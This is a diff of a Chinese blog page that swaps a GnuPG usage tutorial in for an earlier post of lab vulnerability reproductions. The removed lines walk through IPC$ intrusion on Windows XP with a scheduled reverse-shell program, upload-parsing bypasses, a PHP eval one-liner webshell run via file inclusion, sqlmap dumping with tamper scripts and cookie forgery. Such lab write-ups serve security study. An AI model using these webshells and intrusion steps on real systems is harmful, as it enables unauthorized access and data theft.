@@ -4,8 +4,19 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="漏洞分析与复现, wwqstudy">
-    <meta name="description" content="共享技术之IPC$共享-IPC$渗透windows xp系统原理windows xp系统安装完成后会自动开启ipc$服务，该服务是在双方之间建立一条安全加密的管道用于双方传输数据，同时在使用该服务需要139或者445端口开放使用共享打印机，">
+    <meta name="keywords" content="gnupg使用, wwqstudy">
+    <meta name="description" content="Gnupg安装与使用Gnupg安装gnupg下载地址
+
+该软件在windows只有命令参数执行方式，在linux有图形化界面
+Gnupg使用
+查看gnupg版本
+
+gpg --version
+
+
+生成密钥
+
+gpg --gen-key //">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +28,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>漏洞分析与复现 | wwqstudy</title>
+    <title>gnupg使用 | wwqstudy</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -319,12 +330,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">漏洞分析与复现</h1>
+                    <h1 class="description center-align post-title">gnupg使用</h1>
                 </div>
             </div>
         </div>
@@ -452,7 +463,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-03-29
+                    2023-04-26
                 </div>
                 
 
@@ -461,14 +472,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    992
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    3 分
                 </div>
                 
 
@@ -491,333 +502,136 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="共享技术之IPC-共享-IPC-渗透windows-xp系统"><a href="#共享技术之IPC-共享-IPC-渗透windows-xp系统" class="headerlink" title="共享技术之IPC$共享-IPC$渗透windows xp系统"></a>共享技术之IPC$共享-IPC$渗透windows xp系统</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>windows xp系统安装完成后会自动开启ipc$服务，该服务是在双方之间建立一条安全加密的管道用于双方传输数据，同时在使用该服务需要139或者445端口开放使用共享打印机，才可以使用该服务</p>
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><ol>
-<li>cmd命令行开启服务</li>
+                <h2 id="Gnupg安装与使用"><a href="#Gnupg安装与使用" class="headerlink" title="Gnupg安装与使用"></a>Gnupg安装与使用</h2><h3 id="Gnupg安装"><a href="#Gnupg安装" class="headerlink" title="Gnupg安装"></a>Gnupg安装</h3><p><a target="_blank" rel="noopener" href="https://www.gnupg.org/download/index.html">gnupg下载地址</a></p>
+<p><img src="/2023/042611340/16.PNG" alt=" "></p>
+<p><strong>该软件在windows只有命令参数执行方式，在linux有图形化界面</strong></p>
+<h2 id="Gnupg使用"><a href="#Gnupg使用" class="headerlink" title="Gnupg使用"></a>Gnupg使用</h2><ol>
+<li>查看gnupg版本</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net start lanmanworkstation<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/032944469/1.PNG" alt="1"></p>
 <ol start="2">
-<li>获取到目标主机ip</li>
+<li>生成密钥</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ping</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --gen-key //简单生成密钥，一些参数是固定的
+gpg --full-gen-key //详细生成密钥，参数自己设置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/032944469/2.PNG" alt="2"></p>
+<p><img src="/2023/042611340/1.PNG" alt=" "></p>
+<p><img src="/2023/042611340/2.PNG" alt=" "></p>
+<p><strong>生成密钥时，会跳出弹框输入密码，那个就是私钥的密码</strong></p>
+<p><strong>生成之后的样子：</strong></p>
+<p><img src="/2023/042611340/3.PNG" alt=" "></p>
+<p><strong>pub下D1BCEB…是密钥ID，在上传公钥到公钥库会用到</strong></p>
+<ol start="2">
+<li>查看本机私钥库</li>
+</ol>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg -K 或者 gpg --list-secret-keys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2023/042611340/4.PNG" alt=" "></p>
 <ol start="3">
-<li>建立空连接</li>
+<li>查看本机公钥库</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>ipc$ <span class="token string">""</span> /user <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg -k
+gpg --list-public-keys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/032944469/3.PNG" alt="3"></p>
+<p><img src="/2023/042611340/5.PNG" alt=" "></p>
 <ol start="4">
-<li>删除连接</li>
+<li>生成撤销证书</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>ipc$ /del<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --gen-revoke <span class="token punctuation">[</span>用户ID<span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/032944469/4.PNG" alt="4"></p>
+<p><strong>别人选项一生成的直接添加信息，我的没看见</strong></p>
 <ol start="5">
-<li>建立非空连接</li>
+<li>输出公钥</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>ipc$ <span class="token string">"密码"</span> /user:<span class="token string">"账号"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg -a -o public_file.key --export 公钥pub的ID
 
-<p><img src="/2023/032944469/5.PNG" alt="5"></p>
+<span class="token comment"># a-->armor 表示密钥以ASCII的形式输出，默认以二进制的形式输出</span>
+<span class="token comment"># o-->output 指定写入的文件</span>
+gpg --keyserver keys.openpgp.org --recv-keys 5550D5D614E9CC36F1B731B930B117F460FCAF5F  <span class="token comment"># 从网站拉去他人公钥</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <ol start="6">
-<li>将目标主机c盘映射为客户机(本机)的z盘</li>
+<li>输出私钥</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net use z: <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span class="token punctuation">\</span>c$ <span class="token string">"密码"</span> /user:<span class="token string">"账号"</span> //注意其中的是c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg -a -o private_file.key --export-secret-keys 私钥sec的ID
 
-<p><img src="/2023/032944469/6.PNG" alt="6"></p>
-<p><img src="/2023/032944469/7.PNG" alt="7"></p>
+<span class="token comment"># a-->armor 表示密钥以ASCII的形式输出，默认以二进制的形式输出</span>
+<span class="token comment"># o-->output 指定写入的文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <ol start="7">
-<li>使用PcShare软件生成一个反弹shell的exe程序，并将该程序粘贴到z盘</li>
+<li>删除公钥</li>
 </ol>
-<p><img src="/2023/032944469/8.PNG" alt="8"></p>
-<ol start="8">
-<li>查看目标主机时间</li>
-</ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net <span class="token function">time</span> <span class="token punctuation">\</span><span class="token punctuation">\</span>ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --delete-keys 公钥pub的ID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/032944469/9.PNG" alt="9"></p>
+<ol start="8">
+<li>删除私钥</li>
+</ol>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --delete-secret-keys 私钥sec的ID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <ol start="9">
-<li>定时启动反弹shell程序</li>
+<li>在对私钥进行操作时，避免弹框输入密码</li>
 </ol>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">at <span class="token punctuation">\</span><span class="token punctuation">\</span>ip 启动时间 程序名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>在gpg的新的版本中，有时候我们要弹框输入密钥的密码，有的命令也可以实现</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --import --pinentry-mode loopback --batch --passphrase password private_file.key <span class="token comment"># password就是自己输入的密码</span>
 
-<p><img src="/2023/032944469/10.PNG" alt="10"></p>
+gpg --import --pinentry-mode loopback --batch --passphrase-file password_file private_file.key <span class="token comment"># password_file就是自己输入的密码的文本文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <ol start="10">
-<li>等待结果(也可以在映射的z盘中手动启动)</li>
+<li>上传密钥</li>
 </ol>
-<p><img src="/2023/032944469/11.PNG" alt="11"></p>
-<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><h3 id="IIS6-0解析漏洞检测绕过上传漏洞"><a href="#IIS6-0解析漏洞检测绕过上传漏洞" class="headerlink" title="IIS6.0解析漏洞检测绕过上传漏洞"></a>IIS6.0解析漏洞检测绕过上传漏洞</h3><ol>
-<li>首先上传一个正常的照片</li>
-</ol>
-<p><img src="/2023/032944469/12.png" alt="12"></p>
-<ol start="2">
-<li>上传一个shell.php，发现会被拦截</li>
-</ol>
-<p><img src="/2023/032944469/13.png" alt="13"></p>
-<ol start="3">
-<li>burp抓包进行绕过</li>
-</ol>
-<p><img src="/2023/032944469/14.png" alt="14"></p>
-<ol start="4">
-<li>查看上传结果(文件在uploadimg下，文件名是1.php;1980687817.jpg)</li>
-</ol>
-<p><img src="/2023/032944469/15.png" alt="15"></p>
-<ol start="5">
-<li>验证绕过结果</li>
-</ol>
-<p><img src="/2023/032944469/16.png" alt="16"></p>
-<p>success!!!</p>
-<h3 id="IIS6-0目录路径检测解析绕过上传漏洞"><a href="#IIS6-0目录路径检测解析绕过上传漏洞" class="headerlink" title="IIS6.0目录路径检测解析绕过上传漏洞"></a>IIS6.0目录路径检测解析绕过上传漏洞</h3><ol>
-<li>上传正常文件</li>
-</ol>
-<p><img src="/2023/032944469/17.png" alt="17"></p>
-<ol start="2">
-<li>上传asp文件</li>
-</ol>
-<p><img src="/2023/032944469/18.png" alt="18"></p>
-<ol start="3">
-<li>burp抓包绕过</li>
-</ol>
-<p><img src="/2023/032944469/19.png" alt="19"></p>
-<ol start="4">
-<li>上传结果</li>
-</ol>
-<p><img src="/2023/032944469/20.png" alt="20"></p>
-<ol start="5">
-<li>环境存在问题，测试链接失败</li>
-</ol>
-<h3 id="FCK编辑器漏洞"><a href="#FCK编辑器漏洞" class="headerlink" title="FCK编辑器漏洞"></a>FCK编辑器漏洞</h3><p>FCK版本 2.4.2</p>
-<ol>
-<li>在网址后面输入：/_samples/default.html 打开编辑器页面，点 击？可以查看编辑器的版本，版本为 2.4.2</li>
-</ol>
-<p><img src="/2023/032944469/21.png" alt="21"></p>
-<ol start="2">
-<li>在地址后面将/_samples/default.html 改为/whatsnew.html 访问这 个地址可以查看fck的历史版本，最上面的就是当前使用的版本 2.4.2</li>
-</ol>
-<p><img src="/2023/032944469/22.png" alt="22"></p>
-<ol start="3">
-<li>FCK2.4.2 的上传地址：/_samples/default.html 打开编辑器，点 击上传图片，可以进行上传</li>
-</ol>
-<p><img src="/2023/032944469/23.png" alt="23"></p>
-<ol start="4">
-<li>上传正常图片成功，上传 webshell，返回错误信息，提示 类型不正确.上传地址为:/editor/filemanager/browser/defa ult/connectors/test.html</li>
-</ol>
-<p><img src="/2023/032944469/24.png" alt="24"></p>
-<p><img src="/2023/032944469/25.png" alt="25"></p>
-<ol start="5">
-<li>点击 Create Folder 进行新建，输入名字 2.php “确定”</li>
-</ol>
-<p><img src="/2023/032944469/26.png" alt="26"></p>
-<ol start="6">
-<li>在 Current Folder 里输入 2.php，设置好文件保存路径，保存到 2.php 文件夹里,同时修改上传文件扩展名为jpg</li>
-</ol>
-<p><img src="/2023/032944469/27.png" alt="27"></p>
-<ol start="7">
-<li>上传成功，点击 Get Folders and Files 查 看 上 传 路 径 地 址 为 ： /userfiles/file/2.php/shell.jpg</li>
-</ol>
-<p><img src="/2023/032944469/28.png" alt="28"></p>
-<ol start="8">
-<li>验证链接地址为<a target="_blank" rel="noopener" href="http://www.test.com/userfiles/file/2.php/shell.jpg">www.test.com/userfiles/file/2.php/shell.jpg</a></li>
-</ol>
-<p><img src="/2023/032944469/29.png" alt="29"></p>
-<p>success!!!</p>
-<p><strong>FCK2.6.6与之类似，但是2.6.6上传地址是：</strong>/editor/filemanager/connectors/test.html</p>
-<h3 id="Apache-解析漏洞2"><a href="#Apache-解析漏洞2" class="headerlink" title="Apache 解析漏洞2"></a>Apache 解析漏洞2</h3><p><strong>之前我们复现过一个Apache HTTPD解析漏洞，但是这个没有给出上传地址，所以无法进行测试，不知二者之间的联系</strong></p>
-<p><strong>这次复现过程如下：</strong></p>
-<ol>
-<li>打开目标页面，查看信息</li>
-</ol>
-<p><img src="/2023/032944469/51.PNG" alt=" "></p>
-<ol start="2">
-<li>我们构造一个文件多个扩展名(eg:文件名.php(扩展名1).扩展名2)</li>
-</ol>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --send-keys 公钥pub的ID --keyserver keys.openpgp.org <span class="token comment"># keys.openpgp.org 密钥网站 也可以去网站直接上传</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<ol start="3">
-<li>上传</li>
+<ol start="11">
+<li>公钥指纹(核对是否为真)</li>
 </ol>
-<p><img src="/2023/032944469/52.PNG" alt=" "></p>
-<ol start="4">
-<li>发现，只要扩展名2为<strong>7z</strong>时出现flag,给出的解释是<strong>Apache不解析7z格式</strong>,所以会向前进行解析，即：<strong>解析扩展名1</strong>；但是其他的以扩展名2白名单上传的也可以上传成功，在之前复现的Apache HTTPD解析漏洞，上传成功即可解析使用。</li>
-</ol>
-<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="PHP本地文件包含"><a href="#PHP本地文件包含" class="headerlink" title="PHP本地文件包含"></a>PHP本地文件包含</h3><ol>
-<li><p>已知存在文件包含漏洞，包含漏洞产生原因是index.php中的page参数产生，传参方式是get形</p>
-</li>
-<li><p>首先注册账号登录–&gt;控制面板进入个人主页–&gt;头像管理</p>
-</li>
-</ol>
-<p><img src="/2023/032944469/30.png" alt="30"></p>
-<ol start="3">
-<li>构建php一句话木马，因为在被包含文件中，如果包含成功，无论什么格式的文件，都会被当做PHP文件执行(<strong>index.php中可以分析得到</strong>)，以扩展名为jpg上传</li>
-</ol>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">gpg --fingerprint 公钥pub的ID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/2023/032944469/31.png" alt="31"></p>
-<ol start="4">
-<li>上传完毕之后，头像会更换为上传这个，之后点击头像，查看头像链接</li>
+<ol start="12">
+<li>加密</li>
 </ol>
-<p><img src="/2023/032944469/32.png" alt="32"></p>
-<ol start="5">
-<li>进行文件包含，验证</li>
-</ol>
-<p>构建的文件包含链接</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//172.16.12.2/index.php?page=./images/avatars/03/3.jpg//3.jpg是图像上传之后被改的名</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --recipient <span class="token punctuation">[</span>用户ID<span class="token punctuation">]</span> --output test.en.txt --encrypt test.txt
+gpg --recipient 5550D5D614E9CC36F1B731B930B117F460FCAF5F --output test.en.txt --encrypt test.txt
 
-<p><img src="/2023/032944469/33.png" alt="33"></p>
-<p>sucess!!!</p>
-<h2 id="sql注入漏洞"><a href="#sql注入漏洞" class="headerlink" title="sql注入漏洞"></a>sql注入漏洞</h2><h3 id="strcmp函数缺陷"><a href="#strcmp函数缺陷" class="headerlink" title="strcmp函数缺陷"></a>strcmp函数缺陷</h3><ol>
-<li>我们在输入用户名和密码后，点击登录，页面会提示<code>密码不正确</code>，我们可以看到我粘贴复制的地址，路径后面的参数是?pass=hackewmeweplease#</li>
-</ol>
-<p><img src="/2023/032944469/34.PNG" alt="34"></p>
-<ol start="2">
-<li>我们来查看服务器上有什么文件是可以被查看的，然后我们在网站的URL地址上输入robots.txt，我们查看结果</li>
-</ol>
-<p><img src="/2023/032944469/35.PNG" alt="35"></p>
-<ol start="3">
-<li>我们可以发现服务器返回给我我们的结果是<code>strcmp</code>，我们就可以利用php的弱类型构造，来构造语句,在URL地址上输入<code>?pass[]=1</code></li>
-</ol>
-<p><img src="/2023/032944469/36.PNG" alt="36"></p>
-<ol start="4">
-<li>服务器返回给我们的结果为<code>后台：95de87f12261.php</code>,说明我们的代码文件里面存在着<code>95de87f12261.php</code>文件。然后，我们可以通过访问<code>95de87f12261.php</code>页面来查看信息</li>
-</ol>
-<p><img src="/2023/032944469/37.PNG" alt="37"></p>
-<ol start="5">
-<li>测试是否含有sql注入漏洞，测试出**闭合符为 ‘ 即：1’ – - **，回显为三行，同时会对select进行过滤</li>
-</ol>
-<p><img src="/2023/032944469/38.PNG" alt="38"></p>
-<ol start="6">
-<li>采用sqlmap进行爆破</li>
-</ol>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<span class="token comment"># encrypt参数用于加密，recipient指定ID来加密，recipient参数指定接收者的公钥，output参数指定加密后的文件名，encrypt参数指定源文件。运行上面的命令后，test.en.txt就是已加密的文件，可以把它发给对方。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>发现存在<strong>延时注入、联合查询</strong></p>
-<ol start="7">
-<li>暴当前的数据库</li>
+<ol start="13">
+<li>解密</li>
 </ol>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span><span class="token operator">-</span>current<span class="token operator">-</span>db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --output test.de.txt --decrypt test.en.txt
+或者
+gpg --decrypt test.en.txt --output test.de.txt
+<span class="token comment"># 对方收到加密文件以后，就用自己的私钥解密。decrypt参数指定需要解密的文件，output参数指定解密后生成的文件。运行上面的命令，test.de.txt就是解密后的文件。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/2023/032944469/40.PNG" alt="40"></p>
-<ol start="8">
-<li>暴表</li>
+<ol start="14">
+<li>签名</li>
 </ol>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span>D ts_test <span class="token operator">-</span><span class="token operator">-</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 有时，我们不需要加密文件，只需要对文件签名，表示这个文件确实是我本人发出的。sign 参数用来签名。运行下面的命令后，当前目录下生成 demo.txt.gpg 文件，这就是签名后的文件。这个文件默认采用二进制储存</span>
+gpg --sign demo.txt
 
-<p><img src="/2023/032944469/41.PNG" alt="41"></p>
-<ol start="9">
-<li>暴字段，发现并不存在</li>
-</ol>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span>D ts_test <span class="token operator">-</span>T flag <span class="token operator">-</span><span class="token operator">-</span>columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<span class="token comment">#想生成 ASCII 码的签名文件，可以使用 clearsign 参数，当前目录下生成 demo.txt.asc 文件即为生成签名文件</span>
+gpg --clearsign demo.txt
 
-<p><img src="/2023/032944469/42.PNG" alt="42"></p>
-<ol start="10">
-<li>暴数据</li>
-</ol>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u url <span class="token operator">-</span><span class="token operator">-</span>data<span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token operator">-</span>p <span class="token builtin">id</span> <span class="token operator">-</span>D ts_test <span class="token operator">-</span>T flag <span class="token operator">-</span><span class="token operator">-</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<span class="token comment">#生成单独的签名文件，与文件内容分开存放，可以使用 detach-sign 参数，当前目录下生成一个单独的签名文件 demo.txt.sig即为生成签名文件，该文件为二进制形式</span>
+gpg --detach-sign demo.txt
 
-<p><img src="/2023/032944469/43.PNG" alt="43"></p>
-<h3 id="利用Tamper解决sqlmap绕过防注入代码进行注入"><a href="#利用Tamper解决sqlmap绕过防注入代码进行注入" class="headerlink" title="利用Tamper解决sqlmap绕过防注入代码进行注入"></a>利用Tamper解决sqlmap绕过防注入代码进行注入</h3><p><strong>Tamper命令：</strong></p>
-<p>Tamper是sqlmap的一个执行命令，作用是对提交的语句代码进行转义，绕过防御。</p>
-<p>在sqlmap中有专门的一个文件夹用于存储各种sqlmap绕过方式。</p>
-<p><strong>复现流程：</strong></p>
-<ol>
-<li>手工检测判断注入点</li>
-</ol>
-<ul>
-<li><ul>
-<li>整数型</li>
-<li>字符串型</li>
-<li>搜索型</li>
-</ul>
-</li>
-</ul>
-<p>结果：三种测试方式均显示<strong>您的输入含有非法字符</strong>，但是id=2-1时正常，即猜测可能存在sql注入</p>
-<p><img src="/2023/032944469/53.PNG" alt=" "></p>
-<ol start="2">
-<li>判断防注入的类型</li>
-</ol>
-<p>由于报错没有提供信息，我们只知道不合法，所以这点我没判断出来，<strong>由教程知，这里好像是对空格进行转义</strong></p>
-<ol start="3">
-<li>确认注入点，利用sqlmap对注入点进行攻击</li>
-</ol>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">python sqlmap<span class="token operator">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//www.test.com/Art_Show.php?id=2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<span class="token comment">#想采用 ASCII 码形式，要加上 armor 参数</span>
+gpg --armor --detach-sign demo.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><strong>报错：</strong></p>
-<p><img src="/2023/032944469/54.PNG" alt=" "></p>
-<ol start="4">
-<li>利用Tamper绕过防注入代码，进行注入</li>
+<ol start="15">
+<li>签名+加密</li>
 </ol>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php">python sqlmap<span class="token operator">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//www.test.com/Art_Show.php?id=2 --tamper "spacemysqlblank.py" #使用的是tamper文件夹中的py文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gpg --local-user <span class="token punctuation">[</span>发信者 ID<span class="token punctuation">]</span> --recipient <span class="token punctuation">[</span>接收者 ID<span class="token punctuation">]</span> --armor --sign --encrypt demo.txt
 
-<p><img src="/2023/032944469/55.PNG" alt=" "></p>
-<ol start="5">
-<li>爆破</li>
-</ol>
-<p><strong>正常爆破程序，这里不赘述</strong></p>
-<h2 id="信息伪造"><a href="#信息伪造" class="headerlink" title="信息伪造"></a>信息伪造</h2><h3 id="cookie欺诈"><a href="#cookie欺诈" class="headerlink" title="cookie欺诈"></a>cookie欺诈</h3><ol>
-<li>首先判断网页脚本语言</li>
-</ol>
-<p><img src="/2023/032944469/45.PNG" alt=" "></p>
-<p><img src="/2023/032944469/46.PNG" alt=" "></p>
-<p>测试发现网页脚本语言时php</p>
-<ol start="2">
-<li>查看网页源代码，发现一段js代码，分析可知cookie存在问题</li>
-</ol>
-<p><img src="/2023/032944469/44.PNG" alt=" "></p>
-<p><img src="/2023/032944469/47.PNG" alt=" "></p>
-<ol start="3">
-<li>使用burpsuite抓包，修改cookie=1，进行破解</li>
-</ol>
-<p><img src="/2023/032944469/48.PNG" alt=" "></p>
-<h3 id="ip伪造"><a href="#ip伪造" class="headerlink" title="ip伪造"></a>ip伪造</h3><ol>
-<li>分析源代码</li>
-</ol>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">function</span> <span class="token function-definition function">GetIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"HTTP_CLIENT_IP"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#获取代理服务器发送的IP</span>
-	<span class="token variable">$cip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"HTTP_CLIENT_IP"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"HTTP_X_FORWARDED_FOR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#获取HTTP请求端的真实IP</span>
-	<span class="token variable">$cip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"HTTP_X_FORWARDED_FOR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
